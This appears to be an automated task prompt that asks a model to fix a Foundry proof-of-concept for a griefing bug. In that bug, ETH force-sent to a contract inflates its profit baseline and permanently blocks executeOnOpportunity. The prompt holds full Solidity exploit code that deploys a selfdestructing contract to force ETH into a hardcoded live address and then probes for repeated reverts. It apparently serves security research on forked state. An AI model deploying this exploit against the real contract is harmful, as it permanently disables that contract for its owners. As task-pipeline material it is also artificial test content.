You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Forced ETH donations can permanently brick `executeOnOpportunity`
- claim: Profitability is measured against `address(this).balance` at the start of each run, so anyone can raise the required profit threshold by sending or force-sending ETH to the contract. Because the contract has no withdrawal path, the inflated baseline cannot be reset.
- impact: A griefing attacker can permanently make `executeOnOpportunity` fail once the trapped balance is high enough that the strategy cannot end with `initialBalance + 0.1 ether`. This creates a permissionless denial of service against the contract's only execution path.
- exploit_paths: ["An attacker transfers ETH to the contract or force-sends ETH via `SELFDESTRUCT`", "`executeOnOpportunity` snapshots the donated balance in `initialBalance`", "The final check `address(this).balance >= initialBalance + 0.1 ether` becomes unattainable, causing every call to revert"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IOpportunityLike {
    function executeOnOpportunity() external;
}

contract ForceEther {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}

contract CapitalSink {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}

contract BoostReservoir {
    receive() external payable {}
}

contract FlawVerifier {
    address public constant LIVE_TARGET = 0x76EA342BC038d665e8a116392c82552D2605edA1;
    uint256 public constant REQUIRED_UPSIDE = 0.1 ether;
    uint256 public constant DEMO_DONATION = 0.100000000000000001 ether;

    enum Verdict {
        Unset,
        Validated,
        Refuted,
        Inconclusive
    }

    Verdict public verdict;

    bool public usedForceSendPath;
    bool public path0DonationObserved;
    bool public path1SnapshotObserved;
    bool public path2ThresholdRevertObserved;
    bool public hypothesisValidated;

    uint256 public lastDonation;
    uint256 public targetBalanceBefore;
    uint256 public targetBalanceAfterDonation;
    uint256 public requiredBalanceAfterDonation;
    uint256 public targetBalanceAfterFirstPostProbe;
    uint256 public targetBalanceAfterSecondPostProbe;

    bytes32 public preDonationRevertHash;
    bytes32 public firstPostDonationRevertHash;
    bytes32 public secondPostDonationRevertHash;

    address public witnessTarget;
    address public witnessReservoir;
    address public witnessSink;

    address private _profitToken;
    uint256 private _profitAmount;

    constructor() payable {
        witnessTarget = LIVE_TARGET;
        witnessReservoir = address(this);
    }

    receive() external payable {}

    function donateForced() external payable {
        uint256 amount = msg.value;
        if (amount == 0) {
            amount = address(this).balance;
        }
        _donateForced(amount);
    }

    function executeOnOpportunity() external {
        _reset();

        witnessTarget = LIVE_TARGET;
        witnessReservoir = address(this);

        // Best-effort baseline probe. If the target already reverts the same way
        // before any donation, the finding cannot be cleanly attributed at this
        // fork state and the result is left inconclusive rather than over-claimed.
        (bool preOk, bytes memory preRet) = _probeTarget();
        if (!preOk) {
            preDonationRevertHash = keccak256(preRet);
        }

        targetBalanceBefore = LIVE_TARGET.balance;

        uint256 amountToDonate = address(this).balance;
        if (amountToDonate == 0) {
            verdict = Verdict.Inconclusive;
            _profitToken = address(0);
            _profitAmount = 0;
            return;
        }

        _donateForced(amountToDonate);
        requiredBalanceAfterDonation = targetBalanceAfterDonation + REQUIRED_UPSIDE;

        (bool firstOk, bytes memory firstRet) = _probeTarget();
        targetBalanceAfterFirstPostProbe = LIVE_TARGET.balance;
        if (!firstOk) {
            firstPostDonationRevertHash = keccak256(firstRet);
        }

        (bool secondOk, bytes memory secondRet) = _probeTarget();
        targetBalanceAfterSecondPostProbe = LIVE_TARGET.balance;
        if (!secondOk) {
            secondPostDonationRevertHash = keccak256(secondRet);
        }

        // The only externally visible witness for the snapshot stage is that the
        // target keeps the donated ETH on balance throughout repeated calls, so
        // any profitability check based on address(this).balance now starts from
        // the inflated post-donation baseline.
        path1SnapshotObserved = path0DonationObserved
            && targetBalanceAfterFirstPostProbe == targetBalanceAfterDonation
            && targetBalanceAfterSecondPostProbe == targetBalanceAfterDonation;

        // The threshold-brick stage is witnessed by repeated post-donation
        // executeOnOpportunity reverts with the donated balance still trapped.
        path2ThresholdRevertObserved = path1SnapshotObserved
            && !firstOk
            && !secondOk
            && firstPostDonationRevertHash == secondPostDonationRevertHash
            && firstPostDonationRevertHash != bytes32(0)
            && preDonationRevertHash != firstPostDonationRevertHash;

        hypothesisValidated = path0DonationObserved && path1SnapshotObserved && path2ThresholdRevertObserved;

        if (hypothesisValidated) {
            verdict = Verdict.Validated;
        } else if (firstOk || secondOk) {
            verdict = Verdict.Refuted;
        } else {
            verdict = Verdict.Inconclusive;
        }

        _profitToken = address(0);
        _profitAmount = 0;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _donateForced(uint256 amount) internal {
        if (amount == 0) {
            return;
        }

        lastDonation = amount;
        usedForceSendPath = true;

        ForceEther sink = new ForceEther{value: amount}(payable(LIVE_TARGET));
        witnessSink = address(sink);

        targetBalanceAfterDonation = LIVE_TARGET.balance;
        path0DonationObserved = targetBalanceAfterDonation >= targetBalanceBefore + amount;
    }

    function _probeTarget() internal returns (bool ok, bytes memory ret) {
        (ok, ret) = LIVE_TARGET.call(abi.encodeWithSelector(IOpportunityLike.executeOnOpportunity.selector));
    }

    function _reset() internal {
        verdict = Verdict.Unset;
        usedForceSendPath = false;
        path0DonationObserved = false;
        path1SnapshotObserved = false;
        path2ThresholdRevertObserved = false;
        hypothesisValidated = false;
        lastDonation = 0;
        targetBalanceBefore = 0;
        targetBalanceAfterDonation = 0;
        requiredBalanceAfterDonation = 0;
        targetBalanceAfterFirstPostProbe = 0;
        targetBalanceAfterSecondPostProbe = 0;
        preDonationRevertHash = bytes32(0);
        firstPostDonationRevertHash = bytes32(0);
        secondPostDonationRevertHash = bytes32(0);
        witnessTarget = LIVE_TARGET;
        witnessReservoir = address(this);
        witnessSink = address(0);
        _profitToken = address(0);
        _profitAmount = 0;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 2
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
